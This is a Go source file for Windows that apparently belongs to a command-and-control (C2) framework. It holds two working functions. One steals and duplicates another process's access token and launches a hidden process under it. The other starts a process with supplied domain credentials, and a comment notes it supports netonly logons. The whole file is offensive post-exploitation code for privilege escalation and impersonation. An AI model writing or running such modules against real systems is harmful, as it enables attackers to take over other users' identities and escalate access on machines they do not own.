//go:build windows
// +build windows

package createprocess

import (
	"errors"
	"fmt"
	"strconv"
	"strings"
	"syscall"

	"github.com/latortuga71/GoC2/pkg/winapi"
	"golang.org/x/sys/windows"
)

func CreateProcessWithTokenViaPid(args []string) (string, error) {
	if len(args) < 2 {
		return "", errors.New("Not Enough Args")
	}
	pidStr := args[0]
	binaryArgsW := args[1:]
	pid, err := strconv.Atoi(pidStr)
	if err != nil {
		return "", err
	}
	hProc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		return "", err
	}
	var hToken windows.Token
	var duplicatedToken windows.Token
	err = windows.OpenProcessToken(hProc, windows.TOKEN_IMPERSONATE|windows.TOKEN_DUPLICATE, &hToken)
	if err != nil {
		return "", err
	}
	err = windows.DuplicateTokenEx(hToken, windows.MAXIMUM_ALLOWED, nil, 2, windows.TokenImpersonation, &duplicatedToken)
	if err != nil {
		return "", err
	}
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	binaryArgs := syscall.StringToUTF16Ptr(strings.Join(binaryArgsW, " "))
	res, err := winapi.CreateProcessWithTokenW(syscall.Handle(duplicatedToken), 0x00000001, binaryArgs, windows.CREATE_NO_WINDOW, uintptr(winapi.NullRef), &si, &pi)
	if !res {
		return "", err
	}
	return fmt.Sprintf("Started Process Id %d", pi.ProcessId), nil
}

func CreateProcessWithTokenViaCreds(args []string) (string, error) {
	domainW := args[0]
	userW := args[1]
	passW := args[2]
	binaryArgsW := args[3:]
	user := syscall.StringToUTF16Ptr(userW)
	domain := syscall.StringToUTF16Ptr(domainW)
	pass := syscall.StringToUTF16Ptr(passW)
	binaryArgs := syscall.StringToUTF16Ptr(strings.Join(binaryArgsW, " "))
	startupInfo := &syscall.StartupInfo{}
	startupInfo.ShowWindow = winapi.ShowWindow
	startupInfo.Flags = startupInfo.Flags | winapi.STARTF_USESHOWWINDOW
	processInfo := &syscall.ProcessInformation{}
	logonFlags := uint32(1) // with profile
	//logonFlags := uint32(2) // netcredential only
	// above gives /netonly functionality.
	creationFlags := uint32(windows.CREATE_UNICODE_ENVIRONMENT)
	environment := winapi.ListToEnvironmentBlock(nil)
	err := winapi.CreateProcessWithLogonW(user, domain, pass, logonFlags, binaryArgs, creationFlags, environment, startupInfo, processInfo)
	if err != nil {
		return "", err
	}
	completed := fmt.Sprintf("Started Process %d", processInfo.ProcessId)
	return completed, nil
}
